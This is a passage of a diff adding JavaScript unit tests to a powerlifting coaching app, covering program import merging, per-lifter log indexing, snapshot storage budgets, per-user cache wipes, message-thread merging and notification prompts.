+    A1: { t: 's', v: 'Date' }, B1: { t: 's', v: 'Exercise' }, A2: { t: 's', v: '2026-01-05' }, B2: { t: 's', v: 'Squat' }, B3: { t: 's', v: 'Bench' } } } })[0];
+  eq(merged.rows.length, 3); eq(merged.rows[2].cells.join('|'), '2026-01-05|Bench');   // the merged date fills the row that exists, no other
+  assert(Date.now() - t0 < 15000, 'a million rows that aren\'t there took ' + (Date.now() - t0) + ' ms');
+  const data = []; for (let r = 0; r < IC.MAX_ROWS + 5; r++) data[r] = [{ t: 'n', v: r }, { t: 's', v: 'x' }];
+  const big = IC.tablesFromWorkbook({ SheetNames: ['Big'], Sheets: { Big: { '!ref': 'A1:B' + (IC.MAX_ROWS + 5), '!data': data } } })[0];
+  eq(big.rows.length, IC.MAX_ROWS); eq(big.capped, true); eq(big.rows[IC.MAX_ROWS - 1].cells[0], String(IC.MAX_ROWS - 1));
+});
+
+/* ===========================================================
    Video review (video-review.js): frame geometry, angles,
    hit-testing, the 8 KB cap, compare alignment
    =========================================================== */
@@ -4955,6 +5599,32 @@ test('weeks: % stays %, RIR, pauses, rest weeks, renumbering, lb loads', () => {
   eq(Math.round(lb.weeks[0].days[0].exercises[0].sets[0].weight), 143);
   const gap = PI.draftToWeeks(PI.draftFromRead({ weeks: 3, days: [{ name: 'D', exercises: [{ name: 'Squat', cells: ['3x5 @7', '', '3x3 @8'] }] }] }));
   eq(gap.weeks.length, 2); eq(gap.weeks.map(w => w.number).join(','), '1,2');
+});
+
+test('a few files in a row: each file\'s days line up by name, a repeated day is its next week', () => {
+  const PI = window.PhotoImport;
+  // Everfit prints one workout per PDF: Day 1 and Day 2 of week 1, then of week 2.
+  const one = (day, sq) => ({ name: 'Block', unit: 'kg', weeks: 1, days: [{ name: day, exercises: [{ name: 'Squat', cells: [sq] }, { name: 'Leg curl', cells: ['3x12'] }] }], unsure: [] });
+  const m = PI.mergeReads([one('Day 1', '3x5 @7'), one('Day 2', '4x4 @7'), one('Day 1', '3x5 @8'), one('Day 2', '4x4 @8')]);
+  eq(m.weeks, 2); eq(m.days.map(d => d.name).join(','), 'Day 1,Day 2');
+  eq(m.days[0].exercises[0].cells.join('|'), '3x5 @7|3x5 @8'); eq(m.days[1].exercises[0].cells.join('|'), '4x4 @7|4x4 @8');
+  eq(PI.draftToWeeks(PI.draftFromRead(m)).stats.sets, 2 * (3 + 3 + 4 + 3));
+  // A file that is a whole week (several days, one week) follows on as the next week; new days append.
+  const wk = (n) => ({ name: 'B', weeks: 1, days: [{ name: 'Lower', exercises: [{ name: 'Squat', cells: ['3x' + n] }] }, { name: 'Upper', exercises: [{ name: 'Bench', cells: ['4x' + n] }] }], unsure: [] });
+  const w = PI.mergeReads([wk(5), wk(4), { name: 'B', weeks: 1, days: [{ name: 'Accessories', exercises: [{ name: 'Row', cells: ['3x10'] }] }], unsure: [] }]);
+  eq(w.weeks, 2); eq(w.days.map(d => d.name).join(','), 'Lower,Upper,Accessories'); eq(w.days[2].exercises[0].cells.join('|'), '3x10|');
+  // A multi-week file keeps its weeks; the unsure marks move with their day; one read comes back as it was.
+  const multi = PI.mergeReads([{ name: 'A', weeks: 2, days: [{ name: 'D1', exercises: [{ name: 'Squat', cells: ['3x5', '3x4'] }] }], unsure: [] },
+    { name: 'A2', weeks: 1, days: [{ name: 'D2', exercises: [{ name: 'Bench', cells: ['4x?'] }] }], unsure: [{ day: 1, exercise: 1, week: 1, why: 'smudged' }] }]);
+  eq(multi.weeks, 2); eq(multi.name, 'A'); eq(multi.unsure.length, 1); eq(multi.unsure[0].day, 2); eq(multi.unsure[0].week, 1);
+  eq(PI.mergeReads([PI.SAMPLE]), PI.SAMPLE);
+  eq(PI.mergeReads([]), null);
+});
+test('a few files in a row: the reader takes 3 a minute, so the next one waits its turn', () => {
+  const PI = window.PhotoImport;
+  eq(PI.readWait([], 1000000), 0); eq(PI.readWait([990000, 995000], 1000000), 0);
+  eq(PI.readWait([950000, 960000, 990000], 1000000), 11000);       // the oldest of three in the last minute + 60 s, and a second spare
+  eq(PI.readWait([900000, 960000, 990000], 1000000), 0);
 });
 
 group('intake (intake.js)');
@@ -7510,6 +8180,695 @@ test('the load hint: the top set, or a block with no load yet; never a later blo
   eq(CPg.cpWantsHint(1, { weight: null }), true, 'no load written');
   eq(CPg.cpWantsHint(1, { weight: '150' }), false, 'a load read as a number');
 });
+
+/* ===========================================================
+   Data scale (2026-10-28): the roster's sets indexed per lifter, the per-lifter memos, the snapshot's
+   budget and the per-user wipes. (db.js paging and old-vs-new on generated rosters: test/data-scale.test.mjs)
+   =========================================================== */
+group('data scale (index, memos, snapshot)');
+(() => {
+  const saved = Store.get();
+  const L = (id, a, lift, date, e) => ({ id, athleteId: a, lift, variant: 'Competition', exerciseName: '', weight: Math.round(e * 0.8), reps: 3, rpe: 8, e1rm: e, e1rmComp: e, note: '', date });
+  // The plain filter isPRForLog always was: the reference the index has to agree with.
+  const prRef = (logs, aid, log) => {
+    const earlier = logs.filter(l => l.athleteId === aid && l.lift === log.lift && l.id !== log.id && (l.date < log.date || (l.date === log.date && l.id < log.id)));
+    if (!earlier.length) return false;
+    return log.e1rmComp > Math.max(...earlier.map(l => l.e1rmComp)) + 0.05;
+  };
+  let seed = 7;
+  const rnd = () => { seed ^= seed << 13; seed >>>= 0; seed ^= seed >>> 17; seed ^= seed << 5; seed >>>= 0; return seed / 4294967296; };
+  const randomLogs = (n, lifters) => {
+    const out = [];
+    for (let i = 0; i < n; i++) {
+      const a = 'A' + Math.floor(rnd() * lifters), lift = ['squat', 'bench', 'deadlift'][Math.floor(rnd() * 3)];
+      const d = '2026-' + String(1 + Math.floor(rnd() * 9)).padStart(2, '0') + '-' + String(1 + Math.floor(rnd() * 28)).padStart(2, '0');
+      out.push(L('x' + Math.floor(rnd() * 1e9).toString(36) + i, a, lift, d, rnd() < 0.2 ? 150 : Math.round(100 + rnd() * 100)));
+    }
+    return out;
+  };
+  try {
+    test('the index gives each lifter the rows the filter did, in the same order', () => {
+      const logs = randomLogs(600, 5);
+      Store.set(Object.assign(defaultStore(), { workoutLogs: logs }));
+      ['A0', 'A1', 'A4', 'nobody'].forEach(a => eq(_logsOf(a).map(l => l.id).join(), logs.filter(l => l.athleteId === a).map(l => l.id).join(), a));
+      eq(rosterLogsFor('A1') !== _logsOf('A1'), true, 'rosterLogsFor hands out a copy');
+      eq(Array.from(logDateSet('A2')).sort().join(), Array.from(new Set(logs.filter(l => l.athleteId === 'A2').map(l => l.date))).sort().join());
+    });
+    test('the index follows a push, a new list and Store.update; a live burst moves only its own lifter', () => {
+      const logs = randomLogs(200, 3);
+      Store.set(Object.assign(defaultStore(), { workoutLogs: logs, athletes: [{ id: 'A0' }, { id: 'A1' }, { id: 'A2' }] }));
+      const n0 = _logsOf('A0').length;
+      Store.get().workoutLogs.push(L('p1', 'A0', 'squat', '2026-10-01', 200));   // no Store.update: the length says so
+      eq(_logsOf('A0').length, n0 + 1, 'a push');
+      Store.get().workoutLogs = Store.get().workoutLogs.filter(l => l.athleteId !== 'A2');
+      eq(_logsOf('A2').length, 0, 'a new list');
+      const k0 = _lmemoGet('A0', 'probe', () => 'kept'), st1 = _logIndex().stamps.get('A1');
+      liveApplyBatch(Store.get(), [{ kind: 'log', row: L('live1', 'A0', 'bench', '2026-10-02', 140) }], { role: 'coach', me: 'c' });
+      eq(_lmemoOf('A0').has('probe'), false, 'the lifter who logged: worked out again');
+      eq(_logIndex().stamps.get('A1'), st1, 'the others keep their stamp (and what was kept for them)');
+      _lmemoGet('A1', 'probe', () => 1);
+      Store.update(s => { s.workoutLogs.find(l => l.athleteId === 'A1').e1rmComp = 999; });
+      eq(_lmemoOf('A1').has('probe'), false, 'Store.update may edit sets in place: everyone starts again');
+      eq(k0, 'kept');
+    });
+    test('isPRForLog = the plain filter, on random rows (ties on a day, equal e1RMs, a set not in the Store, a repeated id)', () => {
+      for (let round = 0; round < 6; round++) {
+        const logs = randomLogs(400, 4);
+        if (round === 3) logs.push(Object.assign({}, logs[7], { date: '2026-01-01' }));   // an id twice: the plain path answers
+        if (round === 4) logs.forEach((l, i) => { if (i % 5 === 0) l.id = i; });            // numeric ids: the plain path again
+        Store.set(Object.assign(defaultStore(), { workoutLogs: logs }));
+        const probes = logs.concat([L('zz', 'A1', 'squat', '2026-12-31', 300), L(logs[3].id, logs[3].athleteId, logs[3].lift, '2026-02-02', 999), Object.assign({}, logs[10], { e1rmComp: 1000 })]);
+        probes.forEach((l, i) => eq(isPRForLog(l.athleteId, l), prRef(logs, l.athleteId, l), 'round ' + round + ' log ' + i));
+        probes.forEach((l, i) => eq(isPRForLog('A0', l), prRef(logs, 'A0', l), 'round ' + round + ' as A0, log ' + i));
+      }
+    });
+    test('getE1RMMomentum is kept for the day, and right on either side of UTC midnight', () => {
+      const realNow = Date.now;
+      try {
+        const logs = [];
+        ['squat', 'bench', 'deadlift'].forEach((lift, k) => { for (let d = 0; d < 50; d++) logs.push(L(lift + d, 'M', lift, _isoAddDays('2026-10-01', d), 100 + d * (k === 1 ? 0 : 1))); });
+        Store.set(Object.assign(defaultStore(), { workoutLogs: logs }));
+        const ref = (now, win) => {   // the old body, worked out fresh every call
+          const w = win || 21, dayMs = 864e5, rf = now - w * dayMs, pf = now - 2 * w * dayMs, out = {};
+          let paired = false, up = false;
+          MAIN_LIFTS.forEach(lift => {
+            const ll = logs.filter(l => l.lift === lift);
+            const best = (a, b) => ll.reduce((m, l) => { const x = Date.parse(l.date); return x >= a && x < b && l.e1rmComp > m ? l.e1rmComp : m; }, 0);
+            const r = best(rf, now + dayMs), p = best(pf, rf);
+            if (r && p) { paired = true; if (r - p > 0.05) up = true; out[lift] = { recent: r, prior: p, delta: r - p }; } else if (r) out[lift] = { recent: r, prior: 0, delta: null };
+          });
+          return { perLift: out, hasData: paired, stalling: paired && !up };
+        };
+        const mid = Date.parse('2026-11-10T00:00:00Z');
+        [mid - 1, mid, mid + 1, mid + 864e5 - 1, mid + 7 * 36e5].forEach(at => {
+          Date.now = () => at;
+          [21, 14, 9].forEach(w => {
+            eq(JSON.stringify(getE1RMMomentum('M', w)), JSON.stringify(ref(at, w)), new Date(at).toISOString() + ' window ' + w);
+            eq(JSON.stringify(getE1RMMomentum('M', w)), JSON.stringify(ref(at, w)), 'kept, again');
+          });
+        });
+        const m = getE1RMMomentum('M'); m.perLift.squat.recent = -1; m.stalling = 'x';
+        eq(getE1RMMomentum('M').perLift.squat.recent > 0, true, 'a caller changing its copy never changes the kept one');
+      } finally { Date.now = realNow; }
+    });
+    test('_ofAthlete groups any Store list and lets go on a new version or a new length', () => {
+      const ans = [{ id: 1, athleteId: 'a' }, { id: 2, athleteId: 'b' }, { id: 3, athleteId: 'a' }];
+      Store.set(Object.assign(defaultStore(), { checkinAnswers: ans }));
+      eq(_ofAthlete(Store.get().checkinAnswers, 'a').map(x => x.id).join(), '1,3');
+      Store.get().checkinAnswers.push({ id: 4, athleteId: 'a' });
+      eq(_ofAthlete(Store.get().checkinAnswers, 'a').map(x => x.id).join(), '1,3,4', 'a push');
+      Store.get().checkinAnswers[0] = { id: 9, athleteId: 'b' }; Store.touch();   // replaced in place (a live upsert)
+      eq(_ofAthlete(Store.get().checkinAnswers, 'b').map(x => x.id).join(), '9,2', 'replaced, after the version moved');
+      eq(_ofAthlete(null, 'a').length, 0); eq(_ofAthlete(Store.get().checkinAnswers, NaN).length, 0);
+    });
+    test('snapshotTrimList keeps the window, and each lifter\'s best set of each lift from before it', () => {
+      const logs = [L('o1', 'a', 'squat', '2025-01-01', 200), L('o2', 'a', 'squat', '2025-02-01', 210), L('o3', 'a', 'bench', '2025-03-01', 120), L('o4', 'b', 'squat', '2025-03-01', 190),
+        L('n1', 'a', 'squat', '2026-10-01', 205), L('n2', 'b', 'bench', '2026-10-02', 100)];
+      eq(snapshotTrimList('workoutLogs', logs, 'date', '2026-09-01').map(l => l.id).join(), 'o2,o3,o4,n1,n2', 'window + the best before it, in Store order');
+      eq(snapshotTrimList('bodyweight', [{ date: '2026-01-01' }, { date: '2026-10-01' }], 'date', '2026-09-01').length, 1);
+      eq(snapshotTrimList('workoutLogs', logs, 'date', null), logs, 'no window: the list itself');
+      const s = snapshotStoreAt({ workoutLogs: logs, programs: [{ id: 'p' }], bodyweight: [{ date: '2026-01-01' }] }, 0, '2026-10-28');
+      eq(s.workoutLogs.length + s.bodyweight.length, 0, 'step 0: the big lists left out'); eq(s.programs.length, 1, 'the rest kept');
+    });
+    test('_saveSnapshot: whole when it fits, the steps when it doesn\'t, the old one removed when nothing fits', () => {
+      const mkLS = (limit) => { const m = new Map(); return { getItem: k => (m.has(k) ? m.get(k) : null), setItem: (k, v) => { if (limit && String(v).length > limit) { const e = new Error('quota'); e.name = 'QuotaExceededError'; throw e; } m.set(k, String(v)); }, removeItem: k => m.delete(k), key: i => [...m.keys()][i] ?? null, get length() { return m.size; }, m }; };
+      const logs = [];
+      for (let d = 0; d < 700; d++) ['squat', 'bench', 'deadlift'].forEach((lift, k) => logs.push(L('s' + d + k, 'a', lift, _isoAddDays('2024-12-01', d), 100 + (d % 90))));
+      const store = Object.assign(defaultStore(), { workoutLogs: logs, programs: [{ id: 'p', weeks: [] }] });
+      const u = { id: '00000000-0000-4000-8000-0000000000aa', userType: 'athlete' }, key = _snapKey(u.id);
+      let ls = mkLS();
+      eq(_saveSnapshot(u, store, { storage: ls, budget: 5e6, today: '2026-10-28' }), true);
+      eq(JSON.parse(ls.getItem(key)).trimmedTo, null, 'fits: whole');
+      eq(JSON.parse(ls.getItem(key)).store.workoutLogs.length, logs.length);
+      ls = mkLS();
+      eq(_saveSnapshot(u, store, { storage: ls, budget: 90000, today: '2026-10-28' }), true);
+      const snap = JSON.parse(ls.getItem(key));
+      eq([365, 120, 42, 14, 7].includes(snap.trimmedTo), true, 'a step: ' + snap.trimmedTo);
+      eq(ls.getItem(key).length <= 90000, true, 'within the budget');
+      const since = _addDaysISO('2026-10-28', -snap.trimmedTo);
+      eq(snap.store.workoutLogs.filter(l => l.date >= since).length, logs.filter(l => l.date >= since).length, 'every set in the window');
+      eq(snap.store.workoutLogs.filter(l => l.date < since).length, 3, 'one best set a lift from before it');
+      ls = mkLS(70000);   // the device says no at 70 000 characters
+      eq(_saveSnapshot(u, store, { storage: ls, budget: 5e6, today: '2026-10-28' }), true);
+      eq(ls.getItem(key).length <= 70000, true, 'a quota error goes to the next step');
+      ls = mkLS(); ls.setItem(key, '{"old":1}');
+      const huge = Object.assign({}, store, { programs: [{ id: 'p', weeks: 'x'.repeat(200000) }] });
+      eq(_saveSnapshot(u, huge, { storage: ls, budget: 100000, today: '2026-10-28' }), false, 'nothing fits');
+      eq(ls.getItem(key), null, 'the old snapshot is gone (it would open a stale program offline)');
+    });
+    test('the per-user copies: a wipe takes this user\'s, the sweep takes other accounts\', nothing else', () => {
+      const m = new Map(), ls = { getItem: k => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)), removeItem: k => m.delete(k), key: i => [...m.keys()][i] ?? null, get length() { return m.size; } };
+      const A = '00000000-0000-4000-8000-00000000000a', B = '00000000-0000-4000-8000-00000000000b';
+      ['powa-snapshot-', 'powa-coach-notes-', 'powa-coach-settings-', 'powa-client-billing-', 'powa-client-payments-', 'powa-intake-', 'powa-teams-'].forEach(p => { ls.setItem(p + A, '1'); ls.setItem(p + B, '1'); });
+      ls.setItem('powa-theme', 'dark'); ls.setItem('powa-outbox', '[]'); ls.setItem('powa-snapshot-not-a-uuid', '1');
+      _sweepOtherUsersCaches(A, ls);
+      eq([...m.keys()].filter(k => k.endsWith(B)).length, 0, 'the other account\'s copies go');
+      eq([...m.keys()].filter(k => k.endsWith(A)).length, 7, 'mine stay');
+      _wipeUserCaches(A, ls);
+      eq([...m.keys()].sort().join(), 'powa-outbox,powa-snapshot-not-a-uuid,powa-theme', 'signed out: mine go, the rest stay');
+    });
+  } finally { Store.set(saved); }
+})();
+
+/* ===========================================================
+   The desk's who-wrote-last (2026-10-28): a digest is read fresh every time (DB.coachInbox keeps none),
+   the coach's own reply moves the thread at once (sent here, or heard live from their phone), and a
+   digest read before that reply went can't put "Message waiting" back (deskThreadSaw / deskThreadsMerge).
+   =========================================================== */
+group('desk threads (who wrote last)');
+(() => {
+  const C = 'c', A = 'a';
+  const row = (aid, sender, at, body, extra) => Object.assign({ athleteId: aid, lastAt: at, lastSenderId: sender, lastBody: body, unread: 0 }, extra || {});
+  const msg = (aid, sender, at, body, meta) => ({ id: 'm-' + at, coachId: C, athleteId: aid, senderId: sender, body, createdAt: at, readAt: null, meta: meta || null });
+  test('the coach\'s reply moves who wrote last and is kept local; an older message never replaces a newer one', () => {
+    const th = deskThreadsMerge(null, [row(A, A, '2026-10-27T06:00:00.000000+00:00', 'how was my squat?', { unread: 1 })]);
+    eq(deskThreadSaw(th, msg(A, C, '2026-10-28T12:00:00.123456+00:00', 'looked solid')), true);
+    eq(th[A].lastSenderId, C); eq(th[A].lastBody, 'looked solid'); eq(th[A].local, true); eq(th[A].unread, 1, 'the other fields stay');
+    eq(deskThreadSaw(th, msg(A, C, '2026-10-28T12:00:00.123456+00:00', 'looked solid')), false, 'its echo after the send: nothing to do');
+    eq(deskThreadSaw(th, msg(A, C, '2026-10-28T11:00:00Z', 'an older one')), false, 'older than what the thread shows');
+    eq(th[A].lastBody, 'looked solid');
+    eq(deskThreadSaw(th, msg('b', C, '2026-10-28T12:01:00Z', 'Week 3 notes', { weekly: '2026-10-27' })), true, 'a thread the desk had no row for');
+    eq(th.b.weeklyAt, '2026-10-28T12:01:00Z', 'a week\'s note sets weeklyAt');
+    eq(deskThreadSaw(null, msg(A, C, '2026-10-28T12:00:00Z', 'x')), false);
+  });
+  test('a digest read before the reply went keeps the reply; one that has it (or anything newer) is the server\'s word', () => {
+    const before = [row(A, A, '2026-10-27T06:00:00.000000+00:00', 'how was my squat?', { unread: 1 }), row('b', 'b', '2026-10-28T09:00:00Z', 'hi')];
+    let th = deskThreadsMerge(null, before);
+    deskThreadSaw(th, msg(A, C, '2026-10-28T12:00:00.123456+00:00', 'looked solid'));
+    th = deskThreadsMerge(th, before);   // a read already on its way when the reply went
+    eq(th[A].lastSenderId, C, 'still the coach\'s'); eq(th[A].local, true); eq(th[A].unread, 1, 'the read\'s own fields');
+    eq(th.b.lastBody, 'hi');
+    th = deskThreadsMerge(th, [row(A, C, '2026-10-28T12:00:00.123456+00:00', 'looked solid'), row('b', 'b', '2026-10-28T09:00:00Z', 'hi')]);
+    eq(th[A].lastSenderId, C); eq(th[A].local, undefined, 'the server has it now: no longer local');
+    th = deskThreadsMerge(th, [row(A, A, '2026-10-28T13:00:00Z', 'thanks! next week?'), row('b', 'b', '2026-10-28T09:00:00Z', 'hi')]);
+    eq(th[A].lastSenderId, A, 'the lifter wrote again after it: the server\'s word');
+    deskThreadSaw(th, msg('z', C, '2026-10-28T14:00:00Z', 'welcome'));
+    th = deskThreadsMerge(th, [row(A, A, '2026-10-28T13:00:00Z', 'thanks! next week?')]);
+    eq(th.z.lastBody, 'welcome', 'a thread the read hasn\'t got yet stays');
+    eq(th.b, undefined, 'a thread that is the server\'s alone goes with the server');
+    th = deskThreadsMerge(th, [row('z', C, '2026-10-28T14:00:00Z', 'welcome', { weeklyAt: '2026-10-21T08:00:00Z' })]);
+    eq(th.z.local, undefined); eq(th.z.weeklyAt, '2026-10-21T08:00:00Z');
+    const kept = deskThreadsMerge({ w: row('w', C, '2026-10-28T15:00:00Z', 'Week 4 notes', { local: true, weeklyAt: '2026-10-28T15:00:00Z' }) }, [row('w', 'w', '2026-10-28T10:00:00Z', 'ok', { weeklyAt: '2026-10-21T08:00:00Z' })]);
+    eq(kept.w.weeklyAt, '2026-10-28T15:00:00Z', 'the newer week\'s note is kept with it');
+  });
+  test('Today: an answered lifter stays answered when the next refresh brings a digest from before the reply', () => {
+    const saved = Store.get();
+    try {
+      Store.set(Object.assign(defaultStore(), { athletes: [{ id: A, name: 'Ana', coachId: C, createdAt: Date.parse('2026-01-01T12:00:00Z') }], workoutLogs: [] }));
+      const now = Date.parse('2026-10-28T12:30:00Z'), today = '2026-10-28';
+      const digest = [row(A, A, '2026-10-27T06:00:00.000000+00:00', 'how was my squat?', { unread: 0 })];
+      let th = deskThreadsMerge(null, digest);
+      const waiting = (threads) => deskReasons(A, { coachId: C, today, now, threads }).some(r => r.type === 'message');
+      eq(waiting(th), true, 'their message has waited 30 hours');
+      deskThreadSaw(th, msg(A, C, '2026-10-28T12:00:00.123456+00:00', 'looked solid'));
+      eq(waiting(th), false, 'answered');
+      th = deskThreadsMerge(th, digest);
+      eq(waiting(th), false, 'a digest from before the reply doesn\'t bring it back');
+    } finally { Store.set(saved); }
+  });
+})();
+group('allow notifications (notify.js)');
+// One calm ask (PowaNotify.decide): with a reason, never while alerts are on or blocked, never twice
+// in two weeks after "Not now", never in the first minute on a new device; the demo always previews.
+const _pnNow = Date.parse('2026-10-28T18:00:00Z');
+const _pnBase = (o) => Object.assign({ now: _pnNow, reason: PowaNotify.LINES.coached, capability: 'web', permission: 'default',
+  subscribed: false, optedOut: false, snoozedAt: 0, firstSeenAt: _pnNow - 10 * 60 * 1000 }, o || {});
+test('asks, with Turn on, when nothing has been decided yet', () => {
+  const d = PowaNotify.decide(_pnBase());
+  eq(d.show, true); eq(d.mode, 'ask'); eq(d.why, 'ok');
+  eq(PowaNotify.decide(_pnBase({ capability: 'native' })).mode, 'ask', 'the iPhone app asks iOS');
+});
+test('no reason, no card', () => {
+  const d = PowaNotify.decide(_pnBase({ reason: null }));
+  eq(d.show, false); eq(d.why, 'no-reason');
+});
+test('alerts already on: never', () => {
+  eq(PowaNotify.decide(_pnBase({ permission: 'granted', subscribed: true })).why, 'on');
+  // the iPhone app re-registers by itself at launch once iOS allows it
+  eq(PowaNotify.decide(_pnBase({ capability: 'native', permission: 'granted', subscribed: false })).why, 'on');
+});
+test('a browser that allows alerts but holds no subscription for this account still asks', () => {
+  const d = PowaNotify.decide(_pnBase({ permission: 'granted', subscribed: false }));
+  eq(d.show, true, 'Turn on then subscribes without a prompt'); eq(d.mode, 'ask');
+});
+test('blocked: never (the browser or iPhone Settings decides now)', () => {
+  eq(PowaNotify.decide(_pnBase({ permission: 'denied' })).why, 'denied');
+  eq(PowaNotify.decide(_pnBase({ capability: 'native', permission: 'denied' })).why, 'denied');
+  eq(PowaNotify.decide(_pnBase({ permission: 'denied', snoozedAt: _pnNow - 20 * 864e5 })).show, false, 'not even after two weeks');
+});
+test('switched off in the app: never asks again', () => {
+  eq(PowaNotify.decide(_pnBase({ optedOut: true })).why, 'opted-out');
+  eq(PowaNotify.decide(_pnBase({ optedOut: true, permission: 'granted' })).show, false);
+});
+test('two Not nows are a no: the card stops asking', () => {
+  eq(PowaNotify.MAX_SNOOZES, 2);
+  eq(PowaNotify.decide(_pnBase({ snoozes: 1, snoozedAt: _pnNow - 15 * 864e5 })).show, true, 'after the first, it asks once more two weeks later');
+  const d = PowaNotify.decide(_pnBase({ snoozes: 2, snoozedAt: _pnNow - 400 * 864e5 }));
+  eq(d.show, false); eq(d.why, 'declined', 'after the second, never (You → Notifications stays the way in)');
+  eq(PowaNotify.decide(_pnBase({ snoozes: 2, capability: 'ios-app', permission: 'unsupported' })).show, false, 'the iPhone tab card too');
+  eq(PowaNotify.decide(_pnBase({ snoozes: 5, demo: true })).mode, 'preview', 'the demo still previews');
+});
+test('Not now waits 14 days', () => {
+  eq(PowaNotify.decide(_pnBase({ snoozedAt: _pnNow - 60 * 1000 })).why, 'snoozed');
+  eq(PowaNotify.decide(_pnBase({ snoozedAt: _pnNow - 13 * 864e5 })).why, 'snoozed');
+  eq(PowaNotify.decide(_pnBase({ snoozedAt: _pnNow - 14 * 864e5 - 1000 })).show, true, 'day 15 asks again');
+  eq(PowaNotify.decide(_pnBase({ snoozedAt: _pnNow + 400 * 864e5 })).show, true, 'a stamp from a clock far ahead is ignored');
+});
+test('never in the first minute of the first session', () => {
+  eq(PowaNotify.decide(_pnBase({ firstSeenAt: _pnNow - 30 * 1000 })).why, 'first-minute');
+  eq(PowaNotify.decide(_pnBase({ firstSeenAt: _pnNow })).why, 'first-minute');
+  eq(PowaNotify.decide(_pnBase({ firstSeenAt: 0 })).why, 'first-minute', 'no stamp = this is the first minute');
+  eq(PowaNotify.decide(_pnBase({ firstSeenAt: _pnNow - 61 * 1000 })).show, true);
+});
+test('an iPhone browser tab says how (the app) instead of a Turn on that cannot work', () => {
+  const d = PowaNotify.decide(_pnBase({ capability: 'ios-app', permission: 'unsupported' }));
+  eq(d.show, true); eq(d.mode, 'how');
+  eq(PowaNotify.decide(_pnBase({ capability: 'ios-app', permission: 'unsupported', snoozedAt: _pnNow - 864e5 })).why, 'snoozed', 'Not now holds there too');
+  eq(PowaNotify.decide(_pnBase({ capability: 'none', permission: 'unsupported' })).why, 'unsupported', 'nowhere to deliver: no card');
+});
+test('the demo always previews, whatever the device says', () => {
+  const d = PowaNotify.decide(_pnBase({ demo: true, permission: 'denied', optedOut: true, snoozedAt: _pnNow, firstSeenAt: _pnNow, capability: 'none' }));
+  eq(d.show, true); eq(d.mode, 'preview');
+  eq(PowaNotify.decide(_pnBase({ demo: true, reason: null })).show, false, 'still needs a reason');
+});
+test('what this device can do', () => {
+  const web = { secure: true, sw: true, pushManager: true, notification: true };
+  eq(PowaNotify.capability({ native: true }), 'native');
+  eq(PowaNotify.capability(web), 'web', 'desktop and Android browsers');
+  eq(PowaNotify.capability(Object.assign({ ios: true }, web)), 'web', 'an iPhone Home Screen app on iOS 16.4+');
+  eq(PowaNotify.capability({ ios: true, secure: true, sw: true, notification: false, pushManager: false }), 'ios-app', 'a Safari tab on iPhone');
+  eq(PowaNotify.capability(Object.assign({}, web, { secure: false })), 'none', 'no HTTPS, no push');
+  eq(PowaNotify.capability({}), 'none');
+});
+test('the line fits the person (and only when a ping would come)', () => {
+  eq(PowaNotify.reasonFor('athlete', { coached: true, club: true, native: true }), 'Get a ping when your coach replies.');
+  eq(PowaNotify.reasonFor('athlete', { club: true, native: true }), 'Get a ping when a training buddy nudges you.');
+  eq(PowaNotify.reasonFor('athlete', { native: true }), 'Get a ping when rest is up, even with the app closed.');
+  eq(PowaNotify.reasonFor('athlete', {}), null, 'a lifter alone on the web: nothing to ping about');
+  eq(PowaNotify.reasonFor('coach', {}), 'Get a ping for PRs, messages and missed sessions.');
+  eq(PowaNotify.reasonFor('coach', { lifters: 0 }), null, 'a coach with no lifters yet');
+  eq(PowaNotify.hueFor('buddy'), 'gold'); eq(PowaNotify.hueFor('coached'), 'green'); eq(PowaNotify.hueFor('coach'), 'green');
+});
+test('demo card: Turn on and Not now write nothing and ask for nothing', () => {
+  const was = window._demoMode, enable = PowaPush.enable;
+  // admin.html runs this page on the live site: whatever "Not now" this device holds stays as it was.
+  const keys = ['powa-notify-snooze', 'powa-notify-snoozes'];
+  const kept = keys.map(k => localStorage.getItem(k));
+  const stored = () => keys.map(k => localStorage.getItem(k)).join('|');
+  let asked = 0;
+  PowaPush.enable = () => { asked++; return Promise.resolve(false); };
+  try {
+    window._demoMode = true; PowaNotify.reset();
+    const before = stored();
+    const slot = PowaNotify.lifterCard({ coached: true });
+    assert(slot && slot.querySelector('.pn-card'), 'the card shows in the demo');
+    eq(slot.querySelector('.pn-line').textContent, 'Get a ping when your coach replies.');
+    eq(slot.querySelector('.pn-on').textContent, 'Turn on'); eq(slot.querySelector('.pn-later').textContent, 'Not now');
+    assert(/hue-green/.test(slot.querySelector('.pn-card').className), 'coach replies: the Coach green');
+    slot.querySelector('.pn-on').click();
+    eq(asked, 0, 'no permission asked'); eq(stored(), before, 'nothing stored');
+    assert(/Preview only/.test(slot.querySelector('.pn-sub').textContent), 'says it is a preview');
+    eq(PowaNotify.lifterCard({ coached: true }), null, 'gone for the rest of this page');
+    PowaNotify.reset();
+    const again = PowaNotify.coachCard({});
+    assert(again && /PRs, messages and missed sessions/.test(again.querySelector('.pn-line').textContent), 'the coach line');
+    again.querySelector('.pn-later').click();
+    eq(stored(), before, 'Not now stores nothing in the demo');
+    eq(PowaNotify.coachCard({}), null);
+    eq(PowaNotify.coachCard({ lifters: 0 }), null, 'no lifters, no card');
+    // The coach's first screen leaves a spot; placeCoach fills it, or takes it away.
+    PowaNotify.reset();
+    const mk = () => { const root = document.createElement('div'), a = document.createElement('div'), spot = document.createElement('div'), b = document.createElement('div');
+      a.className = 'cl-do'; spot.className = 'pn-host'; b.className = 'cl-pweek'; root.appendChild(a); root.appendChild(spot); root.appendChild(b); return root; };
+    const r1 = mk(), placed = PowaNotify.placeCoach(r1, 6);
+    assert(placed && placed.querySelector('.pn-card'), 'the card takes the spot');
+    eq(Array.from(r1.children).map(n => n.className.split(' ')[0]).join(','), 'cl-do,pn-slot,cl-pweek', 'after Do first, before This week, the spot gone');
+    PowaNotify.reset();
+    const r2 = mk();
+    eq(PowaNotify.placeCoach(r2, 0), null, 'no lifters yet: no card');
+    eq(Array.from(r2.children).map(n => n.className).join(','), 'cl-do,cl-pweek', 'and no empty spot left behind');
+    eq(PowaNotify.placeCoach(document.createElement('div'), 6), null, 'no spot: nothing placed');
+    PowaNotify.reset();
+    eq(stored(), before, 'reset() leaves the device\'s answers alone');
+  } finally {
+    window._demoMode = was; PowaPush.enable = enable; PowaNotify.reset();
+    keys.forEach((k, i) => { try { if (kept[i] == null) localStorage.removeItem(k); else localStorage.setItem(k, kept[i]); } catch (e) {} });
+  }
+});
+
+/* ===========================================================
+   Sign-out wipe, the offline queue's owner, CSV cells (security sweep 2026-10-28 #4, #6, #7).
+   These touch this browser's own storage (admin.html runs this page on the live site): every
